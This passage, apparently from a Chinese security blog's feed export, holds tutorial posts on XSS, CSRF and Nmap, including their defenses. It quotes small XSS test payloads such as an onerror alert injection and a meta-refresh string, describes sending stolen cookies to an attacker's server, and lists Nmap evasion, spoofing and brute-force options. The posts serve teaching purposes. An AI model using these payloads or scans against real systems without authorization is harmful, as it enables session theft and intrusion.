title="1.反射型，危害小，一般"></a>1.反射型，危害小，一般</h3><p>反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。</p><p>特点是：非持久化，必须用户点击带有特定参数的链接才能引起。</p><p>反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入<code>&lt;meta http equiv=&quot;refresh&quot; content=&quot;5&quot; /&gt;</code>，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。</p><p><strong>反射型XSS常见场景：</strong></p><ul><li>将前端获取的内容，直接输出到浏览器页面</li><li>将前端获取的内容，直接输出到HTML标签</li><li>将前端获取的内容，直接输出到<code>&lt;script&gt;</code>标签</li></ul><h3 id="2-存储型，危害大，影响时间长"><a href="#2-存储型，危害大，影响时间长" class="headerlink" title="2.存储型，危害大，影响时间长"></a>2.存储型，危害大，影响时间长</h3><p>存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。</p><p>这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。</p><h3 id="3-dom型，特殊的一种"><a href="#3-dom型，特殊的一种" class="headerlink" title="3.dom型，特殊的一种"></a>3.dom型，特殊的一种</h3><p>dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入<code>?name=&lt;img src=1 onerror=alert(1)&gt;</code>的时候依然会存在 XSS 漏洞。</p><p><strong>漏洞思路：搜索内容、发表文章、留言、评论回复</strong></p><h3 id="XSS漏洞挖掘方法"><a href="#XSS漏洞挖掘方法" class="headerlink" title="XSS漏洞挖掘方法"></a>XSS漏洞挖掘方法</h3><p>根据上面的一些特点，可以总结出几个分析出几个挖掘方法：</p><ol><li>数据接收位置，检查 _POST、$_COOKIE是否经过转义。</li><li>常见的反射型XSS搜索这种类似位置发现次数较多。</li><li>而存储型在文章，评论出现比较多。</li></ol><h2 id="0x03-XSS-Payload"><a href="#0x03-XSS-Payload" class="headerlink" title="0x03 XSS Payload"></a>0x03 XSS Payload</h2><p>XSS攻击成功后，攻击者能够对用户当前浏览器的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”</p><p>XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到。</p><p>一个最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”</p><h2 id="0x04-XSS-攻击平台"><a href="#0x04-XSS-攻击平台" class="headerlink" title="0x04 XSS 攻击平台"></a>0x04 XSS 攻击平台</h2><h3 id="Attack-API"><a href="#Attack-API" class="headerlink" title="Attack API"></a>Attack API</h3><p>Attack API是安全研究者php所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式。</p><h3 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h3><p>BeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整的XSS攻击过程，BeEF有一个控制后台，攻击者可以在后台控制前段的一切。</p><h3 id="XSS-Proxy"><a href="#XSS-Proxy" class="headerlink" title="XSS-Proxy"></a>XSS-Proxy</h3><p>XSS-proxu是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器。</p><h2 id="0x05-终极武器：XSS-Worm"><a href="#0x05-终极武器：XSS-Worm" class="headerlink" title="0x05 终极武器：XSS Worm"></a>0x05 终极武器：XSS Worm</h2><p>以往的蠕虫是利用服务器软件漏洞进行传播的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。</p><p>XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的，但是发起XSS Worm攻击也有一定的条件。</p><p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击</p><p>Samy Worm、百度空间蠕虫</p><h2 id="0x06-XSS构造技巧"><a href="#0x06-XSS构造技巧" class="headerlink" title="0x06 XSS构造技巧"></a>0x06 XSS构造技巧</h2><p>利用字符编码、绕过长度限制、使用<base>标签、</p><p>jQuery是JavaScript框架</p><h2 id="0x07-XSS的防御"><a href="#0x07-XSS的防御" class="headerlink" title="0x07 XSS的防御"></a>0x07 XSS的防御</h2><h3 id="四两拨千斤：HttpOnly"><a href="#四两拨千斤：HttpOnly" class="headerlink" title="四两拨千斤：HttpOnly"></a>四两拨千斤：HttpOnly</h3><p>浏览器将禁止页面的JavaScript访问带有HttpOnly属性的COOkie。</p><p>严格说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。</p><h3 id="一个Cookie的使用过程如下："><a href="#一个Cookie的使用过程如下：" class="headerlink" title="一个Cookie的使用过程如下："></a>一个Cookie的使用过程如下：</h3><p>Step1：浏览器向服务器发送请求，这时候没有Cookie</p><p>Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。</p><p>Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送Cookie</p><p>HttpOnly是在Set-Cookie时标记的。</p><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>常见的Web漏洞如XSS、SQL Injection等，都要求攻击构造一些特殊字符，这些特殊字符可能正常用户不会用到，所以输入检查就有存在的必要了。</p><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码转义的方式来防御XSS攻击。</p><p>安全的编码函数，针对HTML代码的编码方式是HtmlEncode</p><p><strong>XSS攻击主要发生在MVC架构中的View层，大部分的XSS漏洞可以在模板系统中解决。</strong></p><p><strong>XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。</strong></p><h3 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h3><p>网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。</p><p>在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如<iframa>、<script>、<base>、<form>等，也应该严格禁止的。</p><p>在标签的选择上，应该使用白名单，避免使用黑名单。</p><h3 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h3><p>从JavaScript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p><p>服务器端直接输出变量到JavaScript。</p></script></iframa></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-什么是XSS（Cross-Site-Scripting）&quot;&gt;&lt;a href=&quot;#0x01-什么是XSS（Cross-Site-Scripting）&quot; class=&quot;headerlink&quot; title=&quot;0x01 什么是XSS（Cross-Site Scripting）&quot;&gt;&lt;/a&gt;0x01 什么是XSS（Cross-Site Scripting）&lt;/h2&gt;&lt;p&gt;XSS即跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>邪恶的CSRF</title>
    <link href="http://yoursite.com/2018/08/30/%E9%82%AA%E6%81%B6%E7%9A%84CSRF/"/>
    <id>http://yoursite.com/2018/08/30/邪恶的CSRF/</id>
    <published>2018-08-30T12:59:56.000Z</published>
    <updated>2018-08-30T13:22:44.324Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-什么是CSRF"><a href="#0x01-什么是CSRF" class="headerlink" title="0x01 什么是CSRF"></a>0x01 什么是CSRF</h2><p>CSRF的全名是Cross Site Regery，即跨站点请求伪造，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。</p><a id="more"></a><p>而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p><p>csrf主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。</p><h2 id="0x02-CSRF的攻击过程大致如图："><a href="#0x02-CSRF的攻击过程大致如图：" class="headerlink" title="0x02 CSRF的攻击过程大致如图："></a>0x02 CSRF的攻击过程大致如图：</h2><p><img src="/images/pasted-103.png" alt="upload successful"></p><h2 id="0x03-CSRF攻击存在的道理"><a href="#0x03-CSRF攻击存在的道理" class="headerlink" title="0x03 CSRF攻击存在的道理"></a>0x03 CSRF攻击存在的道理</h2><p>一种攻击方式之所以能够存在，必然是因为它能够达到某种特定的目的。比如：通过程序中的缓冲区溢出漏洞，我们可以尝试控制程序的流程，使其执行任意代码；通过网站上的SQL注入漏洞，我们可以读取数据库中的敏感信息，进而获取Webshell甚至获取服务器的控制权等等。而CSRF攻击能够达到的目的是使受害者发出由攻击者伪造的请求，那么这有什么作用呢？</p><p>显然，这种攻击的威力和受害者的身份有着密切的联系。说到这儿我们可以思考一下，攻击者之所以要伪造请求由受害者发出，不正是想利用受害者的身份去达到一些目的吗？换句话说，受害者身上有达到这个目的所必需的条件，</p><p>而这些必需的条件在Web应用中便是各种各样的认证信息，攻击者就是利用这些认证信息来实现其各种各样的目的。</p><h2 id="0x04-CSRF的危害"><a href="#0x04-CSRF的危害" class="headerlink" title="0x04 CSRF的危害"></a>0x04 CSRF的危害</h2><p>前面说了CSRF的基本概念，列举了几个CSRF的攻击场景，讲述了几种CSRF的攻击方法，现在我们来简单总结一下CSRF攻击可能造成的危害。</p><h3 id="CSRF能做的事情大概如下："><a href="#CSRF能做的事情大概如下：" class="headerlink" title="CSRF能做的事情大概如下："></a>CSRF能做的事情大概如下：</h3><p><strong>1）篡改目标网站上的用户数据；</strong></p><p><strong>2）盗取用户隐私数据；</strong></p><p><strong>3）作为其他攻击向量的辅助攻击手法；</strong></p><p><strong>4）传播CSRF蠕虫。</strong></p><p>其中前两点我们在之前的例子中已经做了比较详细的说明，不再赘述。第三点即将其他攻击方法与CSRF进行结合进行攻击，接下来我们以实际的漏洞实例来说明CSRF的第三个危害。</p><p>另外，CSRF蠕虫就是利用之前讲述的各种攻击方法，并且在攻击代码里添加了形成蠕虫传播条件的攻击向量，这一点会在本文的最后介绍。</p><h2 id="0x05-CSRF进阶"><a href="#0x05-CSRF进阶" class="headerlink" title="0x05 CSRF进阶"></a>0x05 CSRF进阶</h2><h3 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h3><p>浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie。</p><p>两者的区别在于，Third-party Cookie是服务器在Set-cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所有浏览器关闭后，Session Cookie就失效了。</p><h2 id="0x06-CSRF的防御"><a href="#0x06-CSRF的防御" class="headerlink" title="0x06 CSRF的防御"></a>0x06 CSRF的防御</h2><p>要防御CSRF攻击，我们就要牢牢抓住CSRF攻击的几个特点。</p><p>首先是“跨域”，我们发现CSRF攻击的请求都是跨域的，针对这一特点，我们可以在服务端对HTTP请求头部的Referer字段进行检查。一般情况下，用户提交的都是站内的请求，其Referer中的来源地址应该是站内的地址。至关重要的一点是，前端的JavaScript无法修改Referer字段，这也是这种防御方法成立的条件。</p><p>不过需要说明的是，有的时候请求并不需要跨域，比如我们后面讲到的结合XSS进行攻击的时候，有的时候甚至没有Referer字段…，这些也是使用这种防御方法的弊病所在。</p><p>第二点是“伪造”，这也是CSRF攻击的核心点，即伪造的请求。我们来想一下，攻击者为什么能够伪造请求呢？换句话说，攻击者能够伪造请求的条件是什么呢？纵观之前我们伪造的所有请求，无一例外，请求中所有参数的值都是我们可以预测的，如果出现了攻击者无法预测的参数值，那么将无法伪造请求，CSRF攻击也不会发生。基于这一点，我们有了如下两种防御方法：</p><ol><li><strong>添加验证码；</strong></li><li><strong>使用一次性token。</strong></li></ol><p>先看看第一种。验证码的核心作用是区分人和机器，而CSRF攻击中的请求是在受害者上当的情况下由浏览器自动发出的，属于机器发出的请求，攻击者无法预知验证码的值，所以使用验证码可以很好地防御CSRF攻击，但毫无疑问，验证码会一定程度地影响用户体验，所以我们要在安全和用户体验之间找到一个平衡点。</p><p>再看看第二种方法。所谓token是一段字母数字随机值，我们可以把它理解为一个服务端帮我们填好的验证码！每当我们访问该页面时，服务端会根据时间戳、用户ID、随机串等因子生成一个随机的token值并传回到前端的表单中，当我们提交表单时，token会作为一个参数提交到服务端进行验证。在这个请求过程中，token的值也是攻击者无法预知的，而且由于同源策略的限制，攻击者也无法使用JavaScript获取其他域的token值，所以这种方法可以成功防御CSRF攻击，也是现在用的最多的防御方式。</p><p>但是，需要注意的一点是，token的生成一定要随机，即不能被攻击者预测到，否则这种防御将形同虚设。另外，token如果作为GET请求的参数在url中显示的话，很容易在Referer中泄露。还有更重要的一点：如果在同域下存在XSS漏洞，那么基于token的CSRF防御将很容易被击破，我们后面再说。</p><p>除了“跨域”和“伪造”两点，我们还可以注意到CSRF在攻击时间上的特点：CSRF攻击都是在受害者已经完成身份认证之后发生的，这是由CSRF攻击的目的所决定的。基于这一点，我们还可以想出一些缓解CSRF攻击的方法（注意是缓解），比如缩短Session的有效时间等等，可能一定程度上会降低CSRF攻击的成功率。</p><p>总结一下上面的防御方法如下：</p><ol><li><strong>验证Referer；</strong></li><li><strong>使用验证码；</strong></li><li><strong>使用CSRF token；</strong></li><li><strong>限制Session生命周期。</strong></li></ol><p><strong>其中第四种属于缓解类方法，就不多说了。我们看一下其他三种方法都分别存在什么弊病。</strong></p><p>Referer最大弊病：有些请求不带Referer；</p><p>验证码最大弊病：影响用户体验；</p><p>CSRF token最大弊病：随机性不够好或通过各种方式泄露，此外，在大型的服务中需要一台token生成及校验的专用服务器，需要更改所有表单添加的字段，有时效性的问题。</p><p>那么有没有其它的办法能够有效地防御CSRF攻击呢？xeye团队的monyer提出了下面这样的方法：</p><p>原理与token差不多：当表单提交时，用JavaScript在本域添加一个临时的Cookie字段，并将过期时间设为1秒之后在提交，服务端校验有这个字段即放行，没有则认为是CSRF攻击。</p><p>前面提到，token之所以可以防御CSRF，是因为攻击者无法使用JavaScript获取外域页面中的token值，必须要遵守同源策略；而临时Cookie的原理是：Cookie只能在父域和子域之间设置，也遵守同源策略，攻击者无法设置该Cookie。</p><h2 id="0x07-CSRF蠕虫"><a href="#0x07-CSRF蠕虫" class="headerlink" title="0x07 CSRF蠕虫"></a>0x07 CSRF蠕虫</h2><h3 id="蠕虫有两大特征："><a href="#蠕虫有两大特征：" class="headerlink" title="蠕虫有两大特征："></a>蠕虫有两大特征：</h3><p><strong>1） 传播性；</strong></p><p><strong>2） 恶意行为。</strong></p><p>蠕虫的恶意行为是由其传播性引起的，也就是说，凡是传播可以做的事，蠕虫基本上都可以做，而且还可以做些和特定蠕虫有关的事，比如我们要说的CSRF蠕虫就可以大批量地获取用户的隐私信息（CSRF的危害之一嘛）。</p><p>所以，我们主要研究CSRF蠕虫的传播性。</p><p>CSRF蠕虫的传播性如何实现呢？在前面我们提到过，CSRF蠕虫就是在CSRF的攻击页面中加入了蠕虫传播的攻击向量。这听上去感觉很容易，但实施起来恐怕还要多考虑一些东西。</p><p>仔细想想，在一个SNS网站上传播CSRF蠕虫有一个不得不考虑的问题：蠕虫面对的是不同的用户，而不仅仅是某一个受害者。那对于不同的用户，其对应的请求（CSRF核心：伪造的请求嘛）会不会有些地方不一样呢？</p><p>没错，在之前的CSRF攻击中，我们的攻击目标是某一个特定的个体。当我们可以预测其请求的所有参数之后，我们就可以发起攻击。但是在SNS网站上传播CSRF蠕虫就不是这么简单。即使每个用户的所有请求参数都可以预测，但是对于不同的用户，其对应的请求参数是不一样的，我们无法像前面的攻击那样构造攻击页面，必须想办法获取这些标识不同用户的数据。</p><p><strong>方法一：利用服务端脚本获取</strong></p><p>在这里，我们构造的攻击页面不是一个简单的.html文件了，而是一个服务端脚本，如php、asp等等。</p><p>受害者的标识信息，如用户id等，经常出现在url中，这样我们就可以利用服务端脚本来获取请求的Referer中的用户id，以此为基础构造出html+js的攻击页面，在攻击向量中添加我们服务端脚本的链接，以此造成蠕虫传播的效果。</p><p><strong>方法二：利用JSON HiJacking技术获取</strong></p><p>JSON HiJacking的攻击方法前面已经讲得很详细了，如果网站上提供了这样的获取数据的接口，那么利用这种技术获取用户的隐私信息是一个不错的方法。</p><p>综上所述，如果一个SNS网站上存在CSRF漏洞，并且我们有办法获取到用户的标识信息，那么就满足了CSRF蠕虫传播的条件，这个网站就是可蠕虫的。</p><h2 id="0x08-参考文献"><a href="#0x08-参考文献" class="headerlink" title="0x08 参考文献"></a>0x08 参考文献</h2><p><a href="https://wooyun.kieran.top/#!/drops/1189.%E9%82%AA%E6%81%B6%E7%9A%84CSRF" target="_blank" rel="noopener">https://wooyun.kieran.top/#!/drops/1189.%E9%82%AA%E6%81%B6%E7%9A%84CSRF</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-什么是CSRF&quot;&gt;&lt;a href=&quot;#0x01-什么是CSRF&quot; class=&quot;headerlink&quot; title=&quot;0x01 什么是CSRF&quot;&gt;&lt;/a&gt;0x01 什么是CSRF&lt;/h2&gt;&lt;p&gt;CSRF的全名是Cross Site Regery，即跨站点请求伪造，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSRF" scheme="http://yoursite.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>Nmap的基本使用</title>
    <link href="http://yoursite.com/2018/08/25/Nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/25/Nmap的基本使用/</id>
    <published>2018-08-25T11:59:04.000Z</published>
    <updated>2018-08-25T13:10:23.547Z</updated>
    
    <content type="html"><![CDATA[<p>Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p><a id="more"></a><h2 id="Nmap工作原理"><a href="#Nmap工作原理" class="headerlink" title="Nmap工作原理"></a>Nmap工作原理</h2><p>TCP/IP协议栈指纹准确地判断目标主机的操作系统类型。</p><p><img src="/images/AWVS APPSCAN/51.png" alt="upload successful"></p><h2 id="Nmap特色"><a href="#Nmap特色" class="headerlink" title="Nmap特色"></a>Nmap特色</h2><p>灵活、功能强大、便捷式、简单、免费、记录完整、支持、备受赞誉、流行</p><h2 id="Nmap典型用途："><a href="#Nmap典型用途：" class="headerlink" title="Nmap典型用途："></a>Nmap典型用途：</h2><p>1、通过对设备或者防火墙的探测来审计它的安全性。</p><p>2、探测目标主机所开放的端口。</p><p>3、网络存储，网络映射，维护和资产管理。</p><p>4、通过识别新的服务器审计网络的安全性。</p><p>5、探测网络上的主机</p><h2 id="Nmap扫描命令解释"><a href="#Nmap扫描命令解释" class="headerlink" title="Nmap扫描命令解释"></a>Nmap扫描命令解释</h2><h3 id="使用IP地址扫描"><a href="#使用IP地址扫描" class="headerlink" title="使用IP地址扫描"></a>使用IP地址扫描</h3><p>nmap 192.168.3.14</p><p><img src="/images/AWVS APPSCAN/52.png" alt="upload successful"><br>命令使用了“-v”选项，此选项个给了更多的远程设备的细节。（-vv结果一样）</p><h3 id="扫描多个主机"><a href="#扫描多个主机" class="headerlink" title="扫描多个主机"></a>扫描多个主机</h3><p>扫描多个主机只需要简单地以空格隔开输入他们IP地址或者主机名即可</p><h3 id="p指定扫描的端口范围"><a href="#p指定扫描的端口范围" class="headerlink" title="-p指定扫描的端口范围"></a>-p指定扫描的端口范围</h3><p>nmap -p（22,80,445）ip</p><p>nmap -p 1-100  ip</p><p><strong>nmap -sP ip</strong></p><p><strong>-sP 设置扫描方式为ping扫描</strong></p><p>nmap -sP 192.168.199.138/24</p><p><img src="/images/AWVS APPSCAN/53.png" alt="upload successful"></p><h3 id="路由跟踪扫描"><a href="#路由跟踪扫描" class="headerlink" title="路由跟踪扫描"></a>路由跟踪扫描</h3><p>nmap –traceroute  ip</p><p>–traceroute 记录本机到目标主机的网络节点。</p><p><img src="/images/AWVS APPSCAN/54.png" alt="upload successful"></p><h3 id="Nmap操作系统探测"><a href="#Nmap操作系统探测" class="headerlink" title="Nmap操作系统探测"></a>Nmap操作系统探测</h3><p>使用选项“-O”和“-osscan-guess”帮助尝试探测操作系统信息。</p><p>-sV端口服务版本检测</p><p>nmap -O -sV 192.168.199.138</p><p><img src="/images/AWVS APPSCAN/55.png" alt="upload successful"></p><p>-A 综合扫描</p><p>-A综合扫描，包括系统探测，版本探测，脚本扫描，路由跟踪</p><p>探测在远程主机的操作系统以及版本信息。为了可以探测操作系统和版本，脚本扫描和路由追踪</p><p>-P0  无ping扫描  -Pn  禁ping扫描</p><p>使用“iL”选项的nmap命令去扫描所有在文件列出的IP地址。</p><p>-sL 列表扫描</p><p>-n 禁止DNS反向解析</p><p>-R 反向域名解析  </p><p>nmap -R -sL *.192.168.199.138/24</p><p>-sS 半连接扫描</p><h3 id="使用Zenmap进行扫描"><a href="#使用Zenmap进行扫描" class="headerlink" title="使用Zenmap进行扫描"></a>使用Zenmap进行扫描</h3><p><img src="/images/AWVS APPSCAN/56.png" alt="upload successful"><br><img src="/images/AWVS APPSCAN/57.png" alt="upload successful"></p><h3 id="Nmap提供了-6个端口状态，帮助我们了解目标。"><a href="#Nmap提供了-6个端口状态，帮助我们了解目标。" class="headerlink" title="Nmap提供了 6个端口状态，帮助我们了解目标。"></a>Nmap提供了 6个端口状态，帮助我们了解目标。</h3><p>第一种状态：Open                 （开放）</p><p>第二种状态：Closed               （关闭）</p><p>第三种状态：Filtered              （过滤）</p><p>第四种状态：Unfiltered          （未过滤）</p><p>第五种状态：Open|Filtered    （开放或过滤）</p><p>第六种状态：Closed|Filtered  （关闭或过滤）</p><h3 id="Nmap参数解释："><a href="#Nmap参数解释：" class="headerlink" title="Nmap参数解释："></a>Nmap参数解释：</h3><p>用法nmap [扫描类型] [选项] {目标规格}</p><p>目标规格</p><p>可以通过主机名，IP地址，网络等</p><p>  例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254</p><p>  -iL <inputfilename>: 从主机/网络列表中输入</inputfilename></p><p>  -iR <num hosts="">: 选择随机目标</num></p><p>  –exclude &lt;host1[,host2][,host3],…&gt;: 排除主机/网络</p><p>  –excludefile &lt;exclude_file&gt;: 从文件中排除列表</p><p>主机发现</p><p>  -sL: 列表扫描 - 只需列出要扫描的目标</p><p>  -sn: Ping扫描 - 禁用端口扫描</p><p>  -Pn: 将所有主机视为联机 - 跳过主机发现</p><p>  -PS/PA/PU/PY[portlist]: 对给定端口的TCP SYN / ACK，UDP或SCTP发现</p><p>  -PE/PP/PM: ICMP回显，时间戳和网络掩码请求发现探测</p><p>  -PO[protocol list]: IP协议Ping</p><p>  -n/-R: 永远不要做DNS解析</p><p>  –dns-servers &lt;serv1[,serv2],…&gt;: 指定自定义DNS服务器</p><p>  –system-dns: 使用操作系统的DNS解析器</p><p>  –traceroute: 跟踪每个主机的跳转路径</p><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><p>  -sS/sT/sA/sW/sM: TCP SYN / 连接（）/ ACK / Window / 过时的Maimon扫描</p><p>  -sU: UDP扫描</p><p>  -sN/sF/sX: TCP空，FIN和圣诞节扫描</p><p>  –scanflags <flags>: 自定义TCP扫描标志</flags></p><p>  -sI <zombie host[:="" 探测端口]="">：空闲扫描</zombie></p><p>  -sY/sZ: SCTP INIT / COOKIE-ECHO扫描</p><p>  -sO: IP协议扫描</p><p>  -b <ftp relay="" host="">: FTP反弹扫描端口规格和扫描订单</ftp></p><p>  -p <port ranges="">: 仅扫描指定的端口</port></p><pre><code>例如:  -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</code></pre><p>  –exclude-ports <port ranges="">: 从扫描中排除指定的端口</port></p><p>  -F: 快速模式 - 扫描比默认扫描更少的端口</p><p>  -r: 连续扫描端口 - 不要随机化</p><p>  –top-ports <number>: 扫描<number>最常见的端口</number></number></p><p>  –port-ratio <ratio>: 扫描端口比&lt;比率&gt;更普遍</ratio></p><h3 id="服务-版本检测"><a href="#服务-版本检测" class="headerlink" title="服务/版本检测"></a>服务/版本检测</h3><p>  -sV: 探测打开的端口以确定服务/版本信息</p><p>  –version-intensity <level>: 从0（亮）到9（尝试所有探针）</level></p><p>  –version-light: 限制为最有可能的探针（强度2）</p><p>  –version-all: 尝试每一个探针（强度9）</p><p>  –version-trace: 显示详细版本的扫描活动（用于调试）</p><h3 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h3><p>  -sC: 等同于–script = default</p><p>  –script=<lua scripts="">: <lua scripts=""></lua></lua></p><pre><code>directories, script-files or script-categories:</code></pre><p>  –script-args=&lt;n1=v1,[n2=v2,…]&gt;: 为脚本提供参数</p><p>  –script-args-file=filename: 在文件中提供NSE脚本参数</p><p>  –script-trace: 显示所有发送和接收的数据</p><p>  –script-updatedb: 更新脚本数据库。</p><p>  –script-help=<lua scripts="">: 显示有关脚本的帮助。</lua></p><pre><code>&lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories</code></pre><p>–script=auth:可以对主机或目标主机所在的网段进行应用弱口令检测</p><p>–script=brute：Nmap具有暴力破解的功能，可对数据库、SMB、SNMP等进行简单密码的暴力猜测。</p><p>–script=vulin：可以检查目标主机或网段是否存在常见的漏洞</p><p>–script=realvnc：应用服务扫描脚本，VNC服务。</p><h3 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h3><p>  -O: 启用操作系统检测</p><p>  –osscan-limit: 限制操作系统检测到有前景的目标</p><p>  –osscan-guess: 猜测操作系统更积极</p><p>时间和表现</p><p>  Options which take <time> are in seconds, or append ‘ms’ (milliseconds),:</time></p><p>  ‘s’ (seconds), ‘m’ (minutes), or ‘h’ (hours) to the value (e.g. 30m).:</p><p>  -T<0-5>: 设定时间模板（越快越快）</0-5></p><p>  –min-hostgroup/max-hostgroup <size>: 并行主机扫描组大小</size></p><p>  –min-parallelism/max-parallelism <numprobes>: 探测器并行化</numprobes></p><p>  –min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: 指定探测往返时间。</time></p><p>  –max-retries <tries>: 端口扫描探测重传次数的上限。</tries></p><p>  –host-timeout <time>: 在此之后放弃目标</time></p><p>  –scan-delay/–max-scan-delay <time>: 调整探头之间的延迟</time></p><p>  –min-rate <number>: 发送不低于每秒<number>的数据包</number></number></p><p>  –max-rate <number>: 发送数据包不会比每秒<number>更快</number></number></p><h3 id="防火墙-IDS躲避和防护"><a href="#防火墙-IDS躲避和防护" class="headerlink" title="防火墙/IDS躲避和防护"></a>防火墙/IDS躲避和防护</h3><p>  -f; –mtu <val>: 分段数据包（可选w /给定MTU）</val></p><p>  -D &lt;decoy1,decoy2[,ME],…&gt;: 用诱饵隐形扫描</p><p>  -S &lt;IP_Address&gt;: 欺骗源地址</p><p>  -e <iface>: 使用指定的接口</iface></p><p>  -g/–source-port <portnum>: 使用给定的端口号</portnum></p><p>  –proxies &lt;url1,[url2],…&gt;: 通过HTTP / SOCKS4代理中继连接</p><p>  –data <hex string="">: 附加一个自定义的有效载荷到发送的数据包</hex></p><p>  –data-string <string>: 附加一个自定义的ASCII字符串到发送的数据包</string></p><p>  –data-length <num>: 追加随机数据到发送的数据包</num></p><p>  –ip-options <options>: 发送指定ip选项的数据包</options></p><p>  –ttl <val>: 设置IP生存时间字段</val></p><p>  –spoof-mac &lt;mac address/prefix/vendor name&gt;: 欺骗您的MAC地址</p><p>  –badsum: 发送具有伪造的TCP / UDP / SCTP校验和的数据包</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h3><p>  -oN/-oX/-oS/-oG <file>: 输出扫描正常，XML，s | &lt;rIpt kIddi3，</file></p><pre><code>and Grepable format, respectively, to the given filename.:</code></pre><p>  -oA <basename>: 一次输出三种主要格式</basename></p><p>  -v: 提高详细程度（使用-vv或更多来获得更大的效果）</p><p>  -d: 增加调试级别（使用-dd或更多以获得更好的效果）</p><p>  –reason: 